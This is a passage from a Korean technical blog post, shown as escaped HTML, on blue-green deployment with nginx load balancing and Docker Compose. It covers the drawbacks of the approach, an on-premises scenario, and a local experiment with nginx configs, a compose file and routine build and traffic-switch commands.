  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;단점&quot;&gt;단점&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;추가 리소스 비용
    &lt;ul&gt;
      &lt;li&gt;블루와 그린 두 개 환경을 동시에 유지해야 하므로 비용 증가&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;데이터 동기화
    &lt;ul&gt;
      &lt;li&gt;배포 시 데이터베이스와 같은 상태 정보를 &lt;br /&gt;
공유하거나 동기화하는 작업이 필요&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;온프레미스-환경-블루---그린-배포를-한다면&quot;&gt;온프레미스 환경 블루 - 그린 배포를 한다면?&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;가정
    &lt;ul&gt;
      &lt;li&gt;물리 서버 3대가 있다.&lt;/li&gt;
      &lt;li&gt;서버1
        &lt;ul&gt;
          &lt;li&gt;nginx 로드밸런서&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;서버2, 서버3
        &lt;ul&gt;
          &lt;li&gt;스프링 서버&lt;/li&gt;
          &lt;li&gt;docker compose 로 블루, 그린 환경을 각각 구성한다.&lt;/li&gt;
          &lt;li&gt;현재 배포된 도커 이미지는 my-server:0.0.1 이다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;서버1에서 테스트 용 PC 접근 경로 설정
        &lt;ul&gt;
          &lt;li&gt;테스트용 PC IP만 블루 또는 그린에 &lt;br /&gt;
선택적으로 접근할 수 있도록 nginx 설정&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;(1) 블루 환경에서 운영 중&lt;/li&gt;
  &lt;li&gt;(2) 그린 환경에서 새 버전 배포
    &lt;ul&gt;
      &lt;li&gt;서버2, 서버3에서 새 버전 my-server:0.0.2를 확보한다.&lt;/li&gt;
      &lt;li&gt;새 버전 my-server:0.0.2는 &lt;br /&gt;
docker-registry 서버에 pull 하는 방식으로 가져올 수도 있고&lt;br /&gt;
직접 빌드하여 만드는 방법을 사용할 수도 있다.&lt;/li&gt;
      &lt;li&gt;블루 환경 컨테이너는 그대로 둔 채&lt;br /&gt;
그린 환경 컨테이너를 my-server:0.0.2로 다시 올린다.&lt;/li&gt;
      &lt;li&gt;테스트용 PC에서 테스트를 진행한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;(3) 트래픽 전환
    &lt;ul&gt;
      &lt;li&gt;nginx 로드밸런서에서 트래픽이 그린을 바라보도록&lt;br /&gt;
설정을 변경하고 리로드 한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;(4) 블루 환경 유지(롤백 대비)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;로컬에서-온프레미스-환경-블루---그린-배포-실험&quot;&gt;로컬에서 온프레미스 환경 블루 - 그린 배포 실험&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;가정
    &lt;ul&gt;
      &lt;li&gt;물리 서버 대신 도커 컨테이너를 띄워서 진행한다.&lt;/li&gt;
      &lt;li&gt;컨테이너 구성
        &lt;ul&gt;
          &lt;li&gt;nginx 로드밸런서 컨테이너&lt;/li&gt;
          &lt;li&gt;서버1 블루 컨테이너&lt;/li&gt;
          &lt;li&gt;서버1 그린 컨테이너&lt;/li&gt;
          &lt;li&gt;서버2 블루 컨테이너&lt;/li&gt;
          &lt;li&gt;서버2 그린 컨테이너&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;github repository
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://github.com/a3magic3pocket/blue-green-deployment-sandbox&quot; target=&quot;_blank&quot;&gt;blue-green-deployment-sandbox&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;앞으로의 모든 설명은 blue-green_manifest 디렉토리 하위를 기준으로 한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;준비
    &lt;ul&gt;
      &lt;li&gt;서버
        &lt;ul&gt;
          &lt;li&gt;설명
            &lt;ul&gt;
              &lt;li&gt;스프링 서버&lt;/li&gt;
              &lt;li&gt;/ 로 접근 시 application.yml에 설정한 deployment 문자열을 출력한다.&lt;/li&gt;
              &lt;li&gt;/ 로 접근 시 블루면 blue가 표시되고 그린이면 green이 표시된다.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;빌드 파일 위치
            &lt;ul&gt;
              &lt;li&gt;spring-0.0.1-SNAPSHOT.jar&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;server-blue:0.0.1 이미지 생성
            &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker build &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; server-blue:0.0.1 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./Dockerfile-server &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
          &lt;/li&gt;
          &lt;li&gt;server-green:0.0.1 이미지 생성
            &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker build &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; server-green:0.0.1 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./Dockerfile-server &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;nginx 로드밸런서 설정
        &lt;ul&gt;
          &lt;li&gt;설명
            &lt;ul&gt;
              &lt;li&gt;blue 버전에 트래픽 분배하는 설정파일과&lt;br /&gt;
green 버전에 트래픽 분배하는 설정파일을 준비한다.&lt;/li&gt;
              &lt;li&gt;트래픽 분배 대상을 변경하고 싶다면&lt;br /&gt;
nginx 설정을 변경한 후 nginx를 재시작한다.&lt;/li&gt;
              &lt;li&gt;blue 버전에 트래픽 분배하는 설정 위치
                &lt;ul&gt;
                  &lt;li&gt;blue-green_manifest/loadbalancer-nginx-blue.conf&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;green 버전에 트래픽 분배하는 설정 위치
                &lt;ul&gt;
                  &lt;li&gt;blue-green_manifest/loadbalancer-nginx-green.conf&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;blue 버전에 트래픽 분배하는 설정
            &lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;# loadbalancer-nginx-blue.conf  
upstream blue-upstream {  
    server server1-blue:8080;  
    server server2-blue:8080;  
}  
                    
                    
upstream green-upstream {  
    server server1-green:8080;  
    server server2-green:8080;  
}  
                    
                    
server {  
    listen 80;  
                    
                    
    location / {  
        # 기본적으로 Blue 환경으로 라우팅  
        proxy_pass http://blue-upstream;  
    }  
                    
                    
    location /blue {  
        # 특정 IP만 Blue에 접근 가능  
        # allow test.pc.ip;  # 허용할 IP  
        # deny all;              # 다른 모든 IP는 거부  
                    
                    
        rewrite ^/blue/?(.*)?$ /$1 break;  
        proxy_pass http://blue-upstream/;  # Blue 환경으로 라우팅  
    }  
                    
                    
    location /green {  
        # 특정 IP만 Green에 접근 가능  
        # allow test.pc.ip;  # 허용할 IP  
        # deny all;              # 다른 모든 IP는 거부  
                    
                    
        rewrite ^/green/?(.*)?$ /$1 break;  
        proxy_pass http://green-upstream/;  # Green 환경으로 라우팅  
    }  
}  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
          &lt;/li&gt;
          &lt;li&gt;green 버전에 트래픽 분배하는 설정
            &lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;# loadbalancer-nginx-green.conf  
upstream blue-upstream {  
    server server1-blue:8080;  
    server server2-blue:8080;  
}  
                    
                    
upstream green-upstream {  
    server server1-green:8080;  
    server server2-green:8080;  
}  
                    
                    
server {  
    listen 80;  
                    
                    
    location / {  
        # 기본적으로 Green 환경으로 라우팅  
        proxy_pass http://green-upstream;  
    }  
                    
                    
    location /blue {  
        # 특정 IP만 Blue에 접근 가능  
        # allow test.pc.ip;  # 허용할 IP  
        # deny all;              # 다른 모든 IP는 거부  
                    
                    
        rewrite ^/blue/?(.*)?$ /$1 break;  
        proxy_pass http://blue-upstream/;  # Blue 환경으로 라우팅  
    }  
                    
                    
    location /green {  
        # 특정 IP만 Green에 접근 가능  
        # allow test.pc.ip;  # 허용할 IP  
        # deny all;              # 다른 모든 IP는 거부  
                    
                    
        rewrite ^/green/?(.*)?$ /$1 break;  
        proxy_pass http://green-upstream/;  # Green 환경으로 라우팅  
    }  
}  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;docker-compose.yml
        &lt;ul&gt;
          &lt;li&gt;설명
            &lt;ul&gt;
              &lt;li&gt;nginx와 server 의 컨테이너를 제어하는 docker-compose.yml이다.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;docker-compose.yml
            &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;na&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3.8'&lt;/span&gt;  
                    
                    
&lt;span class=&quot;na&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
  &lt;span class=&quot;na&quot;&gt;loadbalancer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nginx:1.25.3-alpine&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;loadbalancer&lt;/span&gt;    
    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;80:80&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;./loadbalancer-nginx-blue.conf:/etc/nginx/sites-available/loadbalancer-nginx-blue.conf&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;./loadbalancer-nginx-green.conf:/etc/nginx/sites-available/loadbalancer-nginx-green.conf&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;depends_on&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server1-blue&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server1-green&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server2-blue&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server2-green&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;extra_hosts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;host.docker.internal:host-gateway&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;plain-deployment-net&lt;/span&gt;  
                    
                    
  &lt;span class=&quot;na&quot;&gt;server1-blue&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server-blue:0.0.1&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server1-blue&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;java&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-jar&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/spring.jar&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--deployment=blue&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;plain-deployment-net&lt;/span&gt;  
                    
                    
  &lt;span class=&quot;na&quot;&gt;server1-green&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server-green:0.0.1&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server1-green&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;java&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-jar&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/spring.jar&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--deployment=green&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;plain-deployment-net&lt;/span&gt;  
                    
                    
  &lt;span class=&quot;na&quot;&gt;server2-blue&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server-blue:0.0.1&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server2-blue&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;java&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-jar&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/spring.jar&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--deployment=blue&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;plain-deployment-net&lt;/span&gt;  
                    
                    
  &lt;span class=&quot;na&quot;&gt;server2-green&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server-green:0.0.1&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server2-green&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;java&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-jar&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/spring.jar&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--deployment=green&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;plain-deployment-net&lt;/span&gt;  
                    
                    
&lt;span class=&quot;na&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
  &lt;span class=&quot;na&quot;&gt;plain-deployment-net&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
          &lt;/li&gt;
          &lt;li&gt;명령
            &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;c&quot;&gt;# 실행  &lt;/span&gt;
docker compose &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./docker-compose.yml up  
                    
&lt;span class=&quot;c&quot;&gt;# 종료  &lt;/span&gt;
docker compose &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./docker-compose.yml down  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;로드밸런서 nginx에서 블루로 트래픽 분배
    &lt;ul&gt;
      &lt;li&gt;명령
        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker compose &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./docker-compose.yml &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;loadbalancer sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;  
  mv /etc/nginx/conf.d/default.conf /etc/nginx/conf.d/default.conf.bak   
  rm -rf /etc/nginx/conf.d/*.conf  
  ln -s /etc/nginx/sites-available/loadbalancer-nginx-blue.conf /etc/nginx/conf.d/  
  nginx -t  
  nginx -s reload  
&quot;&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;확인
        &lt;ul&gt;
          &lt;li&gt;브라우저에서 http://localhost 으로 들어가 &lt;br /&gt;
blue 문자열이 나오는지 확인&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;새로운 그린 이미지를 빌드하고 &lt;br /&gt;
로드밸런서 nginx에서 트래픽을 블루에서 그린으로 변경
    &lt;ul&gt;
      &lt;li&gt;새로운 그린 이미지 빌드 (server-green:0.0.2)
        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker build &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; server-green:0.0.2 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./Dockerfile-server &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;docker-compose.yml에서 그린 이미지를 &lt;br /&gt;
새로 빌드한 이미지(server-green:0.0.2)로 변경
        &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;na&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3.8'&lt;/span&gt;  
                
                
&lt;span class=&quot;na&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
  &lt;span class=&quot;na&quot;&gt;loadbalancer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nginx:1.25.3-alpine&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;loadbalancer&lt;/span&gt;    
